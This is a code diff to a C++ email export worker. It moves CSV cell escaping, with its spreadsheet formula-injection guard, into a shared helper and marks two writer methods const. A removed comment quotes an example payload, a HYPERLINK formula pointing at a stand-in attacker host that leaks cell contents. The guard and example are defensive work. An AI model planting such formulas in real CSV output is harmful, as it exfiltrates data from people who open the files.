@@ -5,7 +5,8 @@
 /// @brief Exports email items to standard file formats (EML, VCF, ICS, CSV)
 
 #include "sak/email_export_worker.h"
-
+// sak::csvEscape -- the one CSV cell writer, with the CWE-1236 formula guard.
+#include "sak/csv_escape.h"
 #include "sak/email_constants.h"
 #include "sak/eml_writer.h"
 #include "sak/html_email_writer.h"
@@ -35,38 +36,6 @@ constexpr int kImportanceHigh = 2;
 constexpr int kTaskStatusComplete = 2;
 constexpr ushort kMinimumPrintableCodePoint = 32;
 constexpr int kFirstConflictAttempt = 2;
-
-/// True when a cell value would be interpreted as a formula by a spreadsheet
-/// application (leading = + - @, or a leading tab/CR).
-bool startsWithFormulaChar(const QString& value) {
-    const QString trimmed = value.trimmed();
-    if (trimmed.isEmpty()) {
-        return false;
-    }
-    const QChar first = trimmed.at(0);
-    return first == QLatin1Char('=') || first == QLatin1Char('+') || first == QLatin1Char('-') ||
-           first == QLatin1Char('@') || first == QLatin1Char('\t') || first == QLatin1Char('\r');
-}
-
-/// Escape a value for CSV output
-QString csvEscape(const QString& value, QChar delimiter) {
-    QString sanitized = value;
-
-    // Formula/CSV injection: a cell like =HYPERLINK("http://attacker/"&A1) is
-    // executed when the CSV is opened in Excel/Calc. Prefix a single quote so the
-    // value is forced to plain text.
-    if (startsWithFormulaChar(sanitized)) {
-        sanitized.prepend(QLatin1Char('\''));
-    }
-
-    if (sanitized.contains(delimiter) || sanitized.contains(QLatin1Char('"')) ||
-        sanitized.contains(QLatin1Char('\n')) || sanitized.contains(QLatin1Char('\r'))) {
-        QString escaped = sanitized;
-        escaped.replace(QLatin1Char('"'), QStringLiteral("\"\""));
-        return QLatin1Char('"') + escaped + QLatin1Char('"');
-    }
-    return sanitized;
-}
 
 /// Escape a value for a vCard (RFC 6350) / iCalendar (RFC 5545) TEXT property.
 /// Backslash, semicolon and comma are escaped, and any CR/LF is turned into the
@@ -964,7 +933,7 @@ bool EmailExportWorker::writeEml(sak::EmlWriter& writer,
                                  const sak::PstItemDetail& item,
                                  const QVector<QPair<QString, QByteArray>>& attachment_data,
                                  qint64& bytes_written,
-                                 bool include_headers) {
+                                 bool include_headers) const {
     const qint64 before = writer.totalBytesWritten();
     // When eml_include_headers is false, strip the addressing fields on a local
     // copy so EmlWriter emits a body-only .eml (it always renders whatever headers
@@ -987,7 +956,7 @@ bool EmailExportWorker::writeEml(sak::EmlWriter& writer,
 bool EmailExportWorker::writeHtml(sak::HtmlEmailWriter& writer,
                                   const sak::PstItemDetail& item,
                                   const QVector<QPair<QString, QByteArray>>& attachment_data,
-                                  qint64& bytes_written) {
+                                  qint64& bytes_written) const {
     const qint64 before = writer.totalBytesWritten();
     auto write_result = writer.writeMessage(item, attachment_data, {});
     if (!write_result.has_value()) {
@@ -1200,7 +1169,7 @@ bool EmailExportWorker::writeCsv(const QVector<sak::PstItemDetail>& items,
             if (col > 0) {
                 stream << delimiter;
             }
-            stream << csvEscape(columns[col], delimiter);
+            stream << sak::csvEscape(columns[col], delimiter);
         }
         stream << "\r\n";
     }
@@ -1211,7 +1180,7 @@ bool EmailExportWorker::writeCsv(const QVector<sak::PstItemDetail>& items,
             if (col > 0) {
                 stream << delimiter;
             }
-            stream << csvEscape(csvFieldValue(item, columns[col]), delimiter);
+            stream << sak::csvEscape(csvFieldValue(item, columns[col]), delimiter);
         }
         stream << "\r\n";
     }
